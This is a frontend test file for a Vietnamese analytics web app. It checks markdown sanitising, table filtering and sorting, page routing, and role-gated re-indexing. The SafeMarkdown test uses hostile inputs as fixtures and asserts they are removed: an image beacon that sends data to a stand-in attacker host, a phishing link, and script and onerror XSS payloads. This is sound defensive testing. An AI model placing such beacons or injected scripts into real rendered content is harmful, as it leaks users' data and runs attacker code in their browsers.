// @vitest-environment jsdom
import type { ColumnDef } from "@tanstack/react-table";
import { cleanup, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { App } from "@/app";
import { SafeMarkdown } from "@/components/chat/SafeMarkdown";
import { DataTable } from "@/components/ui/data-table";

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe("SafeMarkdown (architecture §1.2 Invariant 3)", () => {
  it("renders GFM formatting and tables while blocking raw HTML, remote images, and links", () => {
    const markdown = [
      "**Tổng doanh thu:** 120 triệu",
      "",
      "| Khu vực | Doanh thu |",
      "| --- | --- |",
      "| Nam | 80 |",
      "",
      "![beacon](https://attacker.example/leak?q=phone)",
      "",
      "[link](https://attacker.example/phish) và https://auto.example/url",
      "",
      "<script>alert(1)</script><img src=x onerror=alert(2)>",
    ].join("\n");

    const { container } = render(<SafeMarkdown content={markdown} />);

    expect(screen.getByText("Tổng doanh thu:")).toBeInTheDocument();
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByText("Nam")).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(screen.getByText(/link/)).toBeInTheDocument();
  });
});

describe("DataTable (@tanstack/react-table)", () => {
  interface Row {
    region: string;
    orders: number;
  }

  const columns: ColumnDef<Row>[] = [
    { accessorKey: "region", header: "Khu vực" },
    { accessorKey: "orders", header: "Đơn hàng" },
  ];

  it("supports filtering and sorting rows", async () => {
    const user = userEvent.setup();
    render(
      <DataTable
        columns={columns}
        data={[
          { region: "Bắc", orders: 20 },
          { region: "Nam", orders: 50 },
        ]}
        searchPlaceholder="Tìm khu vực..."
      />,
    );

    const search = screen.getByPlaceholderText("Tìm khu vực...");
    await user.type(search, "Nam");
    expect(screen.getByText("Nam")).toBeInTheDocument();
    expect(screen.queryByText("Bắc")).not.toBeInTheDocument();

    await user.clear(search);
    await user.click(screen.getByRole("button", { name: "Đơn hàng" }));
    let rows = screen.getAllByRole("row");
    expect(rows[1]).toHaveTextContent("Nam");
    expect(rows[2]).toHaveTextContent("Bắc");

    await user.click(screen.getByRole("button", { name: "Đơn hàng" }));
    rows = screen.getAllByRole("row");
    expect(rows[1]).toHaveTextContent("Bắc");
    expect(rows[2]).toHaveTextContent("Nam");
  });
});

describe("Workspace routing & React Query", () => {
  it("renders AlertsView at /alerts", () => {
    render(<App initialEntries={["/alerts"]} />);
    expect(screen.getByRole("heading", { name: "Cảnh báo bất thường" })).toBeInTheDocument();
    expect(screen.getByText("metric:return_rate")).toBeInTheDocument();
  });

  it("gates semantic re-index on data_admin role and shows counts on success", async () => {
    const user = userEvent.setup();
    const fetchMock = vi.spyOn(globalThis, "fetch").mockResolvedValueOnce(
      new Response(JSON.stringify({ added: 2, updated: 1, skipped: 5, deleted: 0 }), {
        status: 200,
        headers: { "content-type": "application/json" },
      }),
    );

    render(<App initialEntries={["/dictionary"]} />);
    const reindexButton = screen.getByRole("button", { name: /Re-index Changed Chunks/i });
    expect(reindexButton).toBeDisabled();

    await user.selectOptions(screen.getByLabelText("Vai trò"), "data_admin");
    expect(reindexButton).toBeEnabled();

    await user.click(reindexButton);
    expect(await screen.findByText("Added: 2")).toBeInTheDocument();
    expect(screen.getByText("Updated: 1")).toBeInTheDocument();
    expect(fetchMock).toHaveBeenCalledWith(
      "/api/semantic/reindex",
      expect.objectContaining({ method: "POST" }),
    );
  });

  it("renders /approvals and /evals pages", () => {
    const { unmount } = render(<App initialEntries={["/approvals"]} />);
    expect(screen.getByRole("heading", { name: /Phê duyệt truy vấn/i })).toBeInTheDocument();
    unmount();

    render(<App initialEntries={["/evals"]} />);
    expect(screen.getByRole("heading", { name: /Trace & Đánh giá/i })).toBeInTheDocument();
  });
});
